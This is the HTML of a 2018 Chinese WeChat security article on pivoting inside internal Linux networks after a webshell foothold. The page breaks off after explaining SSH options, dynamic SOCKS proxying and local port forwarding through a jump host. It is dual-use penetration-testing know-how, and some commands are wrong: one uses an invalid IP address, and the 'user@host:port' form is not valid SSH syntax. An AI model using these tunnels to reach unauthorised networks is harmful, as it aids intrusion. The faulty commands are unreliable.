<html>
<head>
<title>Linux内网渗透</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
Linux内网渗透
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    戒贤   nMask
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2018-09-25</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p style="text-align: center;" data-mpa-powered-by="yiban.io"><img class="" data-copyright="0" data-ratio="0.3188202247191011" data-s="300,640" src="图片/HACK学习呀_2018-09-25_Linux内网渗透/1_aPbK6xQJIHiaUOB16u0KcQnicDG9pg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou85etJYTkncLGY4Biavb6ibNacP7iaHc5fOEUUHZIlTV3uyqOmgKiaPbK6xQJIHiaUOB16u0KcQnicDG9pg/640?wx_fmt=png'" data-type="png" data-w="712" style=""  /></p><section label="powered by 135editor.com"><section class=""><section><section><section class=""><p style="text-align: center;"><span style="color: rgb(61, 167, 66);"><strong><span style="font-size:20px;line-height:40px;;">渗透工具</span></strong><strong><span style="font-size:20px;line-height:40px;;"></span></strong></span></p><p style="text-align: left;"><br  /></p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font family: 微软雅黑;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><strong><span style="max-width: 100%;color: rgb(0, 122, 170);box-sizing: border-box !important;word-wrap: break-word !important;">能够成功地通过web漏洞获取到webshell，对于一次完整的渗透测试来说，仅仅相当于万里长征的第一步。并不是所有渗透测试都会遇到几百台机器的大内网。</span></strong><span style="max-width: 100%;color: rgb(2, 30, 170);box-sizing: border-box !important;word-wrap: break-word !important;"><strong style="max-width: 620px;color: rgb(0, 176, 80);box-sizing: border-box !important;word-wrap: break-word !important;"></strong></span></p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font family: 微软雅黑;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(2, 30, 170);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">在PTES(渗透测试执行标准)中，把渗透测试分成了七个主要的过程，也就是说现在通常说的前期交互、目标识别、信息收集、漏洞分析、漏洞利用、后渗透测试、报告编制这七大步骤。如果你看过PTES标准，后渗透测试部分的内容，几乎等于其他六个部分的总和。当然，也只是在系统规模达到一定程度的时候，才会明显的感觉出来。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">内网中，如何打开一个稳定、可靠的数据通道，对后续的测试工作起到非常重要的作用。这里分享一些之前渗透测试中常用的方式。在造成最小影响的情况下，构建稳定的内网代理通道。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><h2 style="margin: 10px auto;font-size:24px;line-height:44px;;max-width: 620px;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(0, 122, 170);box-sizing: border-box !important;word-wrap: break-word !important;"><strong style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:18px;line-height:38px;;box-sizing: border-box !important;word-wrap: break-word !important;">第一个工具：SSH</span></strong></span></a></h2><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">SSH在渗透测试中往往扮演了非常重要的角色。一方面，几乎所有的Linux/Unix服务器和网络设备都支持SSH协议。另一方面，SSH是最常用的远程管理协议，网络层面的访问控制协议，往往会为SSH网开一面。很多管理员为了便于管理，都会开放SSH远程管理，总不能每次一出问题就直奔机房吧。SSH本身是安全的，但是安全的通道，同样会在网络攻击中被利用。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;line-height: 22.4px;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;line-height: 22.4px;box-sizing: border-box !important;word-wrap: break-word !important;">SSH最简单的命令行格式如下：</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh root@192.268.201.100<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /><br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">使用-p指定目标服务器上的ssh端口</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh root@192.268.201.100 -p 2222<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">或者用下面的形式：</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh root@192.168.201.100:2222<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">使用-N建立静默连接(建立了连接，但是你看不到会话,这个选项不是所有的ssh都支持，具体看情况)</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh -N &nbsp;root@192.168.201.100:2222<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">使用-f对ssh进行后台执行，这个选项会把ssh转入后台，即使用户登出，ssh会话也不会终端，除非超时。</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh -f &nbsp;root@192.168.201.100:2222<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">只要在本地设置一下代理端口就可以使用了。估计不少同学也是用过类似的方式去访问某些“不可描述”的网站。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">SSH的隧道，说得通俗一些，其实就是端口映射，或者叫端口转发。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">SSH一共支持三种隐射方式：</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><strong style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;">动态映射</strong>(使用-D选项，前面说的就是这种方式)。</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh -D 8080 root@192.168.201.100<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">这个命令行会在本机上监听8080端口，成为一个sock5代理，只要简单设定一下代理，就可以以192.168.201.100作为代理服务器传送流量了。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><strong style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;">本地映射</strong>(使用-L选项)，将远端服务器的端口，隐射到本地。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;line-height: normal;font family: 微软雅黑;box-sizing: border-box !important;word-wrap: break-word !important;"></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;line-height: normal;font family: 微软雅黑;box-sizing: border-box !important;word-wrap: break-word !important;">ssh -L 8080(本地端口):192.168.201.101(目标主机):3306(目标端口) root@192.168.201.100(跳板机)</span><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">以SSH Server 为跳板，将Target Host的端口，映射到本地服务器上。这时候，你访问本地的8080端口，实际访问的，就是Target Host的3306了。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">前提：SSH Server必须要能通过ssh够登陆到Target Host上去。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">场景：SSH Server和Target Host都在内网，但是外部机器只能访问到SSH Server，而无法直接对Target Host做任何请求的时候。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><strong style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></strong></span></p><p style="max-width: 